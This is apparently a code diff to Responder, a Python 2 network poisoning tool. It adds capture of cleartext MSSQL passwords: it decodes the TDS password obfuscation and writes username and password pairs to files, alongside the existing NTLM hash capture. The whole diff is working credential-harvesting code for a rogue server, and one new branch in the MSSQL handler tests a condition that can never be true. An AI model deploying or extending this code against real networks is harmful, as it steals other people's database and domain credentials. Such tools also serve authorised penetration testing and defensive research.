@@ -144,7 +144,7 @@ def PrintData(outfile,user):
        return True
     if os.path.isfile(outfile) == True:
        with open(outfile,"r") as filestr:
-          if re.search(user, filestr.read()):
+          if re.search(user.encode('hex'), filestr.read().encode('hex')):
              filestr.close()
              return False
           if re.search("\$", user):
@@ -423,9 +423,9 @@ def ParseSMBHash(data,client):
        UserOffset = struct.unpack('<H',data[115:117])[0]
        User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
        writehash = User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal
+       outfile = os.path.join(ResponderPATH,"SMB-NTLMv1ESS-Client-"+client+".txt")
        if PrintData(outfile,User+"::"+Domain):
           print "[+]SMB-NTLMv1 hash captured from : ",client
-          outfile = os.path.join(ResponderPATH,"SMB-NTLMv1ESS-Client-"+client+".txt")
           print "[+]SMB complete hash is :", writehash
           WriteData(outfile,writehash,User+"::"+Domain)
        logging.warning('[+]SMB-NTLMv1 complete hash is :%s'%(writehash))
@@ -689,6 +689,38 @@ def ParseSQLHash(data,client):
        logging.warning('[+]MSSQL NTLMv2 User is :%s'%(SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')))
        logging.warning('[+]MSSQL NTLMv2 Complete Hash is : %s'%(Writehash))
 
+def ParseSqlClearTxtPwd(Pwd):
+    Pwd = map(ord,Pwd.replace('\xa5',''))
+    Pw = []
+    for x in Pwd:
+       Pw.append(hex(x ^ 0xa5)[::-1][:2].replace("x","0").decode('hex'))
+    return ''.join(Pw)
+
+def ParseClearTextSQLPass(Data,client):
+    outfile = os.path.join(ResponderPATH,"MSSQL-PlainText-Password-"+client+".txt")
+    UsernameOffset = struct.unpack('<h',Data[48:50])[0]
+    PwdOffset = struct.unpack('<h',Data[52:54])[0]
+    AppOffset = struct.unpack('<h',Data[56:58])[0]
+    PwdLen = AppOffset-PwdOffset
+    UsernameLen = PwdOffset-UsernameOffset
+    PwdStr = ParseSqlClearTxtPwd(Data[8+PwdOffset:8+PwdOffset+PwdLen])
+    UserName = Data[8+UsernameOffset:8+UsernameOffset+UsernameLen].decode('utf-16le')
+    if PrintData(outfile,UserName+":"+PwdStr):
+       print "[+]MSSQL PlainText Password captured from :",client
+       print "[+]MSSQL Username: %s Password: %s"%(UserName, PwdStr)
+       WriteData(outfile,UserName+":"+PwdStr,UserName+":"+PwdStr)
+    logging.warning('[+]MSSQL PlainText Password captured from :%s'%(client))
+    logging.warning('[+]MSSQL Username: %s Password: %s'%(UserName, PwdStr))
+
+
+def ParsePreLoginEncValue(Data):
+    PacketLen = struct.unpack('>H',Data[2:4])[0]
+    EncryptionValue = Data[PacketLen-7:PacketLen-6]
+    if re.search("NTLMSSP",Data):
+       return True
+    else:
+       return False
+
 #MS-SQL server class.
 class MSSQL(BaseRequestHandler):
 
@@ -699,16 +731,22 @@ class MSSQL(BaseRequestHandler):
               self.request.settimeout(0.1)
               ##Pre-Login Message
               if data[0] == "\x12":
-                buffer0 = str(MSSQLPreLoginAnswer())        
-                self.request.send(buffer0)
-                data = self.request.recv(1024)
+                if data[0] == "\x10":
+                   t = MSSQLNTLMChallengeAnswer(ServerChallenge=Challenge)
+                   t.calculate()
+                   buffer1 = str(t) 
+                   self.request.send(buffer1)
+                   data = self.request.recv(1024)
              ##NegoSSP
               if data[0] == "\x10":
-                t = MSSQLNTLMChallengeAnswer(ServerChallenge=Challenge)
-                t.calculate()
-                buffer1 = str(t) 
-                self.request.send(buffer1)
-                data = self.request.recv(1024)
+                if re.search("NTLMSSP",data):
+                   t = MSSQLNTLMChallengeAnswer(ServerChallenge=Challenge)
+                   t.calculate()
+                   buffer1 = str(t) 
+                   self.request.send(buffer1)
+                   data = self.request.recv(1024)
+                else:
+                   ParseClearTextSQLPass(data,self.client_address[0])
                 ##NegoSSP Auth
               if data[0] == "\x11":
                  ParseSQLHash(data,self.client_address[0])
